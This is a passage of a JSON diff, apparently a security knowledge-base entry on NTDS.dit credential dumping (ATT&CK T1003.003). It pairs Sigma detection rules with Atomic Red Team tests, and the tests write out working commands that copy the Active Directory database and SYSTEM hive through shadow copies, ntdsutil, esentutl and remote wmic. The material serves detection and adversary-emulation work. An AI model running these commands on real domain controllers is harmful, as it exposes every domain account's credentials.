'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Access', 'Command: Command Execution'], 'x_mitre_permissions_required': ['Administrator'], 'x_mitre_system_requirements': ['Access to Domain Controller or backup']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4e7050dd-e548-483f-b7d6-527ab4fa784d",
+                        "lookup_data": {
+                            "description": "Detects suspicious creations of a file named ntds.dit, e.g. by a PowerShell parent or in a suspicious directory or a suspicious one liner",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/11\ndescription: Detects suspicious creations of a file named ntds.dit, e.g. by a PowerShell\n  parent or in a suspicious directory or a suspicious one liner\ndetection:\n  condition: selection_file and 1 of selection_process_*\n  selection_file:\n    TargetFilename|endswith: \\ntds.dit\n  selection_process_child:\n    Image|contains:\n    - \\AppData\\\n    - \\Temp\\\n    - \\Public\\\n    - \\PerfLogs\\\n  selection_process_parent:\n    ParentImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\w3wp.exe\n    - \\php-cgi.exe\n    - \\nginx.exe\n    - \\httpd.exe\n  selection_process_parent_path:\n    ParentImage|contains:\n    - \\apache\n    - \\tomcat\n    - \\AppData\\\n    - \\Temp\\\n    - \\Public\\\n    - \\PerfLogs\\\nfalsepositives:\n- Unknown\nid: 4e7050dd-e548-483f-b7d6-527ab4fa784d\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n- https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/\n- https://pentestlab.blog/tag/ntds-dit/\n- https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Gather/Copy-VSS.ps1\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: Suspicious NTDS.DIT Creation\n",
+                            "sigma:id": "4e7050dd-e548-483f-b7d6-527ab4fa784d",
+                            "title": "Suspicious NTDS.DIT Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3a8da4e0-36c1-40d2-8b29-b3e890d5172a",
+                        "lookup_data": {
+                            "description": "Detects suspicious creations of files with names used in various tools that export the NTDS.DIT for exfiltration",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/11\ndescription: Detects suspicious creations of files with names used in various tools\n  that export the NTDS.DIT for exfiltration\ndetection:\n  condition: selection_file\n  selection_file:\n    TargetFilename|endswith:\n    - \\All.cab\n    - .ntds.cleartext\nfalsepositives:\n- Unknown\nid: 3a8da4e0-36c1-40d2-8b29-b3e890d5172a\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://github.com/rapid7/metasploit-framework/blob/eb6535009f5fdafa954525687f09294918b5398d/modules/post/windows/gather/ntds_grabber.rb\n- https://github.com/rapid7/metasploit-framework/blob/eb6535009f5fdafa954525687f09294918b5398d/data/post/powershell/NTDSgrab.ps1\n- https://github.com/SecureAuthCorp/impacket/blob/7d2991d78836b376452ca58b3d14daa61b67cb40/impacket/examples/secretsdump.py#L2405\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: Suspicious NTDS Exfil Filename Patterns\n",
+                            "sigma:id": "3a8da4e0-36c1-40d2-8b29-b3e890d5172a",
+                            "title": "Suspicious NTDS Exfil Filename Patterns",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a58353df-af43-4753-bad0-cd83ef35eef5",
+                        "lookup_data": {
+                            "description": "Detects execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc.",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/14\ndescription: Detects execution of ntdsutil.exe to perform different actions such as\n  restoring snapshots...etc.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n  - CommandLine|contains|all:\n    - snapshot\n    - 'mount '\n  - CommandLine|contains|all:\n    - ac\n    - ' i'\n    - ' ntds'\n  selection_img:\n  - Image|endswith: \\ntdsutil.exe\n  - OriginalFileName: ntdsutil.exe\nfalsepositives:\n- Legitimate usage to restore snapshots\n- Legitimate admin activity\nid: a58353df-af43-4753-bad0-cd83ef35eef5\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments\nrelated:\n- id: 2afafd61-6aae-4df4-baed-139fa1f4c345\n  type: derived\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)\n",
+                            "sigma:id": "a58353df-af43-4753-bad0-cd83ef35eef5",
+                            "title": "Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                        "lookup_data": {
+                            "description": "Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml",
+                            "raw": "author: Samir Bousseaden, @neu5ron\ndate: 2020/03/19\ndescription: Detect AD credential dumping using impacket secretdump HKTL. Based on\n  the SIGMA rules/windows/builtin/win_impacket_secretdump.yml\ndetection:\n  condition: selection\n  selection:\n    name|contains: SYSTEM32\\\n    name|endswith: .tmp\n    path|contains|all:\n    - \\\n    - ADMIN$\nfalsepositives:\n- Unknown\nid: 92dae1ed-1c9d-4eff-a567-33acbd95b00e\nlevel: high\nlogsource:\n  product: zeek\n  service: smb_files\nmodified: 2021/11/27\nreferences:\n- https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.003\ntitle: Possible Impacket SecretDump Remote Activity - Zeek\n",
+                            "sigma:id": "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                            "title": "Possible Impacket SecretDump Remote Activity - Zeek",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b140afd9-474b-4072-958e-2ebb435abd68",
+                        "lookup_data": {
+                            "description": "Detects suspicious invocation of the Get-ADDBAccount script that reads from a ntds.dit file and may be used to get access to credentials without using any credential dumpers",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/16\ndescription: Detects suspicious invocation of the Get-ADDBAccount script that reads\n  from a ntds.dit file and may be used to get access to credentials without using\n  any credential dumpers\ndetection:\n  condition: selection\n  selection:\n    Payload|contains|all:\n    - Get-ADDBAccount\n    - 'BootKey '\n    - 'DatabasePath '\nfalsepositives:\n- Unknown\nid: b140afd9-474b-4072-958e-2ebb435abd68\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nreferences:\n- https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/\n- https://github.com/MichaelGrafnetter/DSInternals/blob/7ba59c12ee9a1cb430d7dc186a3366842dd612c8/Documentation/PowerShell/Get-ADDBAccount.md\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: Suspicious Get-ADDBAccount Usage\n",
+                            "sigma:id": "b140afd9-474b-4072-958e-2ebb435abd68",
+                            "title": "Suspicious Get-ADDBAccount Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
+                        "lookup_data": {
+                            "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
+                            "raw": "author: sam0x90\ndate: 2021/08/06\ndescription: Conti recommendation to its affiliates to use esentutl to access NTDS\n  dumped file. Trickbot also uses this utilities to get MSEdge info via its module\n  pwgrab.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - esentutl\n    - ' /p'\nfalsepositives:\n- To be determined\nfields:\n- User\n- CommandLine\n- ParentCommandLine\n- CurrentDirectory\nid: 7df1713a-1a5b-4a4b-a071-dc83b144a101\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/vxunderground/status/1423336151860002816\n- https://attack.mitre.org/software/S0404/\n- https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1003.003\ntitle: Esentutl Gather Credentials\n",
+                            "sigma:id": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
+                            "title": "Esentutl Gather Credentials",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "11b1ed55-154d-4e82-8ad7-83739298f720",
+                        "lookup_data": {
+                            "description": "Detects suspicious processes that write (copy) a Active Directory database (ntds.dit) file",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects suspicious processes that write (copy) a Active Directory database\n  (ntds.dit) file\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\mshta.exe\n    - \\wsl.exe\n    TargetFilename|endswith: \\ntds.dit\nfalsepositives:\n- Unknown\nid: 11b1ed55-154d-4e82-8ad7-83739298f720\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/\n- https://adsecurity.org/?p=2398\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.003\ntitle: Suspicious Process Writes Ntds.dit\n",
+                            "sigma:id": "11b1ed55-154d-4e82-8ad7-83739298f720",
+                            "title": "Suspicious Process Writes Ntds.dit",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee",
+                        "lookup_data": {
+                            "description": "Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/21\ndescription: Detects Russian group activity as described in Global Threat Report 2019\n  by Crowdstrike\ndetection:\n  condition: all of selection_xcopy_* or all of selection_adexplorer_*\n  selection_adexplorer_cli:\n    CommandLine|contains|all:\n    - -snapshot\n    - '\"\"'\n    - c:\\users\\\n  selection_adexplorer_img:\n  - Image|endswith: \\adexplorer.exe\n  - OriginalFileName: AdExp\n  selection_xcopy_cli:\n    CommandLine|contains|all:\n    - /S\n    - /E\n    - /C\n    - /Q\n    - /H\n    - \\\\\\\\\n  selection_xcopy_img:\n  - Image|endswith: \\xcopy.exe\n  - OriginalFileName: XCOPY.EXE\nfalsepositives:\n- Unknown\nid: b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.001\n- attack.t1003.003\ntitle: Judgement Panda Credential Access Activity\n",
+                            "sigma:id": "b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee",
+                            "title": "Judgement Panda Credential Access Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                        "lookup_data": {
+                            "description": "Detect AD credential dumping using impacket secretdump HKTL",
+                            "raw": "author: Samir Bousseaden, wagga\ndate: 2019/04/03\ndescription: Detect AD credential dumping using impacket secretdump HKTL\ndetection:\n  condition: selection\n  selection:\n    EventID: 5145\n    RelativeTargetName|contains|all:\n    - SYSTEM32\\\n    - .tmp\n    ShareName: \\\\\\\\\\*\\\\ADMIN$\nfalsepositives:\n- Unknown\nid: 252902e3-5830-4cf6-bf21-c22083dfd5cf\nlevel: high\nlogsource:\n  definition: The advanced audit policy setting \"Object Access > Audit Detailed File\n    Share\" must be configured for Success/Failure\n  product: windows\n  service: security\nmodified: 2022/08/11\nreferences:\n- https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.003\ntitle: Possible Impacket SecretDump Remote Activity\n",
+                            "sigma:id": "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                            "title": "Possible Impacket SecretDump Remote Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b17ea6f7-6e90-447e-a799-e6c0a493d6ce",
+                        "lookup_data": {
+                            "description": "Shadow Copies creation using operating systems utilities, possible credential access",
+                            "raw": "author: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\ndescription: Shadow Copies creation using operating systems utilities, possible credential\n  access\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - shadow\n    - create\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wmic.exe\n    - \\vssadmin.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n    - wmic.exe\n    - VSSADMIN.EXE\nfalsepositives:\n- Legitimate administrator working with shadow copies, access for backup purposes\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/10\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1003.002\n- attack.t1003.003\ntitle: Shadow Copies Creation Using Operating Systems Utilities\n",
+                            "sigma:id": "b17ea6f7-6e90-447e-a799-e6c0a493d6ce",
+                            "title": "Shadow Copies Creation Using Operating Systems Utilities",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                        "lookup_data": {
+                            "description": "Files with well-known filenames (parts of credential dump software or files produced by them) creation",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\ndescription: Files with well-known filenames (parts of credential dump software or\n  files produced by them) creation\ndetection:\n  condition: selection\n  selection:\n  - TargetFilename|contains:\n    - \\pwdump\n    - \\kirbi\n    - \\pwhashes\n    - \\wce_ccache\n    - \\wce_krbtkts\n    - \\fgdump-log\n  - TargetFilename|endswith:\n    - \\test.pwd\n    - \\lsremora64.dll\n    - \\lsremora.dll\n    - \\fgexec.exe\n    - \\wceaux.dll\n    - \\SAM.out\n    - \\SECURITY.out\n    - \\SYSTEM.out\n    - \\NTDS.out\n    - \\DumpExt.dll\n    - \\DumpSvc.exe\n    - \\cachedump64.exe\n    - \\cachedump.exe\n    - \\pstgdump.exe\n    - \\servpw.exe\n    - \\servpw64.exe\n    - \\pwdump.exe\n    - \\procdump64.exe\n    - \\Dumpy.exe\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: 8fbf3271-1ef6-4e94-8210-03c2317947f6\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.003\n- attack.t1003.004\n- attack.t1003.005\ntitle: Cred Dump Tools Dropped Files\n",
+                            "sigma:id": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                            "title": "Cred Dump Tools Dropped Files",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "afd12fed-b0ec-45c9-a13d-aa86625dac81",
+                        "lookup_data": {
+                            "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information",
+                            "raw": "author: frack113\ndate: 2022/01/12\ndescription: Adversaries may attempt to access or create a copy of the Active Directory\n  domain database in order to steal credential information\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - win32_shadowcopy\n    - ).Create(\n    - ClientAccessible\nfalsepositives:\n- Legitimate PowerShell scripts\nid: afd12fed-b0ec-45c9-a13d-aa86625dac81\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://attack.mitre.org/datasources/DS0005/\n- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1&viewFallbackFrom=powershell-7\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: Create Volume Shadow Copy with Powershell\n",
+                            "sigma:id": "afd12fed-b0ec-45c9-a13d-aa86625dac81",
+                            "title": "Create Volume Shadow Copy with Powershell",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1003.003",
+                "display_name": "OS Credential Dumping: NTDS",
+                "atomic_tests": [
+                    {
+                        "name": "Create Volume Shadow Copy with vssadmin",
+                        "auto_generated_guid": "dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f",
+                        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "drive_letter": {
+                                "description": "Drive letter to source VSC (including colon)",
+                                "type": "string",
+                                "default": "C:"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Target must be a Domain Controller\n",
+                                "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
+                                "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "vssadmin.exe create shadow /for=#{drive_letter}\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Copy NTDS.dit from Volume Shadow Copy",
+                        "auto_generated_guid": "c6237146-9ea6-4711-85c9-c56d263a6b03",
+                        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "vsc_name": {
+                                "description": "Name of Volume Shadow Copy",
+                                "type": "string",
+                                "default": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
+                            },
+                            "extract_path": {
+                                "description": "Path for extracted NTDS.dit",
+                                "type": "path",
+                                "default": "C:\\Windows\\Temp"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Target must be a Domain Controller\n",
+                                "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
+                                "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
+                            },
+                            {
+                                "description": "Volume shadow copy must exist\n",
+                                "prereq_command": "if not exist #{vsc_name} (exit /b 1)\n",
+                                "get_prereq_command": "echo Run \"Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement\n"
+                            },
+                            {
+                                "description": "Extract path must exist\n",
+                                "prereq_command": "if not exist #{extract_path} (exit /b 1)\n",
+                                "get_prereq_command": "mkdir #{extract_path}\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n",
+                            "cleanup_command": "del \"#{extract_path}\\ntds.dit\"        >nul 2> nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     >nul 2> nul\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Dump Active Directory Database with NTDSUtil",
+                        "auto_generated_guid": "2364e33d-ceab-4641-8468-bfb1d7cc2723",
+                        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "output_folder": {
+                                "description": "Path where resulting dump should be placed",
+                                "type": "path",
+                                "default": "C:\\Windows\\Temp\\ntds_T1003"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Target must be a Domain Controller\n",
+                                "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
+                                "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n",
+                            "cleanup_command": "rmdir /q /s #{output_folder} >nul 2>&1\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create Volume Shadow Copy with WMI",
+                        "auto_generated_guid": "224f7de0-8f0a-4a94-b5d8-989b036c86da",
+                        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "drive_letter": {
+                                "description": "Drive letter to source VSC (including colon and backslash)",
+                                "type": "string",
+                                "default": "C:\\"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Target must be a Domain Controller\n",
+                                "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
+                                "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "wmic shadowcopy call create Volume=#{drive_letter}\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create Volume Shadow Copy remotely with WMI",
+                        "auto_generated_guid": "d893459f-71f0-484d-9808-ec83b2b64226",
+                        "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "drive_letter": {
+                                "description": "Drive letter to source VSC (including colon and backslash)",
+                                "type": "string",
+                                "default": "C:\\"
+                            },
+                            "target_host": {
+                                "description": "IP Address / Hostname you want to target",
+                                "type": "string",
+                                "default": "localhost"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
+                                "prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
+                                "get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create Volume Shadow Copy remotely (WMI) with esentutl",
+                        "auto_generated_guid": "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865",
+                        "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "source_path": {
+                                "description": "File to shadow copy",
+                                "type": "string",
+                                "default": "c:\\windows\\ntds\\ntds.dit"
+                            },
+                            "target_path": {
+                                "description": "Target path of the result file",
+                                "type": "string",
+                                "default": "c:\\ntds.dit"
+                            },
+                            "target_host": {
+                                "description": "IP Address / Hostname you want to target",
+                                "type": "string",
+                                "default": "localhost"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
+                                "prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
+                                "get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create Volume Shadow Copy with Powershell",
+                        "auto_generated_guid": "542bb97e-da53-436b-8e43-e0a7d31a6c24",
+                        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "drive_letter": {
+                                "description": "Drive letter to source VSC (including colon)",
+                                "type": "string",
+                                "default": "C:\\"
+                            }
+                        },
+                        "executor": {
+                            "command": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create Symlink to Volume Shadow Copy",
+                        "auto_generated_guid": "21748c28-2793-4284-9e07-d6d028b66702",
+                        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "drive_letter": {
+                                "description": "Drive letter to source VSC (including colon)",
+                                "type": "string",
+                                "default": "C:"
+                            },
+                            "symlink_path": {
+                                "description": "symlink path",
+                                "type": "string",
+                                "default": "C:\\Temp\\vssstore"
+                            }
+                        },
+                        "executor": {
+                            "command": "vssadmin.exe create shadow /for=#{drive_letter}\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create Volume Shadow Copy with diskshadow",
+                        "auto_generated_guid": "b385996c-0e7d-4e27-95a4-aca046b119a7",
+                        "description": "This test is intended to be run on a domain controller\nAn alternative to using vssadmin to create a Volume Shadow Copy for extracting ntds.dit\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "filename": {
+                                "description": "Location of the script",
+                                "type": "Path",
+                                "default": "PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt"
+                            }
+                        },
+                        "executor": {
+                            "command": "mkdir c:\\exfil\ndiskshadow.exe /s #{filename}\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 10:39:06"
+}
